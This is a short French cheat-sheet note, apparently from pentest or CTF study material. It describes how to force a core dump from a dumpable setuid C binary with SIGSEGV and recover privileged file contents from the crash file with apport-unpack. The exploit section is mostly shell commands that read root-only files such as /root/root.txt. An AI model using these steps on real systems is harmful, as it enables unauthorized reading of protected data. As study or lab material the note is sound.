# Coredump

> Utiliser les coredumps générés par un programme C setuid pour récupérer des informations nécessitant un niveau de privilèges supérieur
>
> Pré-requis :
>
> - Le programme est **SETUID**, peut donc accéder en lecture à des fichiers nécessitant un niveau de privilège important ;
> - Le programme peut générer des **coredumps** du fait de la ligne suivante (par défaut, ce n'est pas le cas)

```c
prctl(PR_SET_DUMPABLE, 1);
```



###  Exploit

```bash
# Ouvrir 2 sessions SSH

# Session 1
$ ./<BINAIRE_SETUID_C>
# Lire un fichier sensible (e.g. /root/root.txt)

# Session 2
$ watch "ps aux | grep <BINAIRE_SETUID_C>"
## On utilise le signal SIGSEGV, provoquant alors le core dump
$ kill -n 11 <PID_du_process_count>

# Récupération du fichier de crash généré
$ cd /var/crash/<NOM_BINAIRE_C>.crash
$ apport-unpack <NOM_BINAIRE_C>.crash <REPERTOIRE_EXTRACT>
# Récupération du contenu ayant été lu par le fichier SETUID avant de coredump
$ string CoreDump
```

